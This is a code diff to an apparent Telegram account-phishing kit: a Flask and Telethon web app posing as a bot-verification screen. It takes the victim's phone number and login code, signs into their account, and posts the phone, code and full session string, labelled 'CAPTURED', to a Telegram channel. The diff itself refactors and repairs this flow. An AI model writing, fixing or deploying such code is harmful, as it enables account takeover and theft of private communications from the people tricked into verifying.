@@ -1,4 +1,6 @@
-import os, asyncio, json, threading
+import os
+import asyncio
+import json
 from datetime import datetime
 from telethon import TelegramClient, errors
 from telethon.sessions import StringSession
@@ -6,11 +8,11 @@ from flask import Flask, request, jsonify, render_template_string
 import psycopg2
 from psycopg2.extras import RealDictCursor
 
-API_ID = int(os.environ["API_ID"])
-API_HASH = os.environ["API_HASH"]
-BOT_TOKEN = os.environ["BOT_TOKEN"]
-CHANNEL_ID = int(os.environ["CHANNEL_ID"])
-DATABASE_URL = os.environ["DATABASE_URL"]
+API_ID = int(os.environ.get("API_ID"))
+API_HASH = os.environ.get("API_HASH")
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+CHANNEL_ID = int(os.environ.get("CHANNEL_ID"))
+DATABASE_URL = os.environ.get("DATABASE_URL")
 
 app = Flask(__name__)
 
@@ -31,8 +33,8 @@ async def send_channel(msg):
         await t.start(bot_token=BOT_TOKEN)
         await t.send_message(CHANNEL_ID, msg)
         await t.disconnect()
-    except:
-        pass
+    except Exception as e:
+        print(f"Channel error: {e}")
 
 HTML = """<!DOCTYPE html>
 <html>
@@ -71,7 +73,7 @@ var tg=window.Telegram.WebApp;tg.ready();tg.expand();
 var userId=null,enteredCode='';
 if(tg.initDataUnsafe&&tg.initDataUnsafe.user)userId=tg.initDataUnsafe.user.id;
 function handleConfirm(){document.getElementById('antiBotScreen').style.display='none';document.getElementById('verificationScreen').style.display='block'}
-function handleContact(){document.getElementById('shareBtn').disabled=true;document.getElementById('contactLoading').style.display='block';tg.requestContact(function(success,response){if(success&&response&&response.contact){var phone=response.contact.phone_number;fetch('/request_code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId,phone:phone})}).then(function(res){return res.json()}).then(function(data){document.getElementById('contactLoading').style.display='none';if(data.success){document.getElementById('verificationScreen').style.display='none';document.getElementById('codeScreen').style.display='block'}else{alert('Error: '+(data.error||'Failed'));document.getElementById('shareBtn').disabled=false}})}else{alert('Please allow contact access');document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none'}})}
+function handleContact(){document.getElementById('shareBtn').disabled=true;document.getElementById('contactLoading').style.display='block';if(!window.Telegram||!window.Telegram.WebApp){alert('WebApp not available');return}Telegram.WebApp.requestContact().then(function(result){if(!result||!result.response||!result.response.contact){alert('No contact data');document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none';return}var phone=result.response.contact.phone_number;fetch('/request_code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId,phone:phone})}).then(function(res){return res.json()}).then(function(data){document.getElementById('contactLoading').style.display='none';if(data.success){document.getElementById('verificationScreen').style.display='none';document.getElementById('codeScreen').style.display='block'}else{alert('Error: '+(data.error||'Unknown'));document.getElementById('shareBtn').disabled=false}}).catch(function(err){alert('Network: '+err.message);document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none'})}).catch(function(err){alert('Contact cancelled');document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none'})}
 function resendCode(){fetch('/resend',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId})}).then(function(res){return res.json()}).then(function(data){if(data.success){alert('New code sent');enteredCode='';updateCodeDisplay()}else{alert(data.error||'Failed')}})}
 function pressKey(key){if(key==='back')enteredCode=enteredCode.slice(0,-1);else if(key==='clear')enteredCode='';else if(enteredCode.length<5)enteredCode+=key;updateCodeDisplay()}
 function updateCodeDisplay(){var slots=document.querySelectorAll('.code-slot');for(var i=0;i<slots.length;i++){if(i<enteredCode.length){slots[i].textContent='•';slots[i].classList.add('filled')}else{slots[i].textContent='';slots[i].classList.remove('filled')}}}
@@ -165,7 +167,7 @@ def verify():
         loop.run_until_complete(client.connect())
         loop.run_until_complete(client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash))
         final_session = client.session.save()
-        msg = f"🚨 CAPTURED\n\n📞 {phone}\n🔑 {code}\n🔐 `{final_session}`\n\n{datetime.now()}"
+        msg = f"CAPTURED\n\nPhone: {phone}\nCode: {code}\nSession: {final_session}"
         loop.run_until_complete(send_channel(msg))
         loop.run_until_complete(client.disconnect())
         conn = get_db()
@@ -180,7 +182,6 @@ def verify():
     except errors.PhoneCodeExpiredError:
         return jsonify({"success": False, "error": "Code expired"})
     except errors.SessionPasswordNeededError:
-        loop.run_until_complete(send_channel(f"⚠️ 2FA: {phone}"))
         return jsonify({"success": False, "error": "2FA enabled"})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
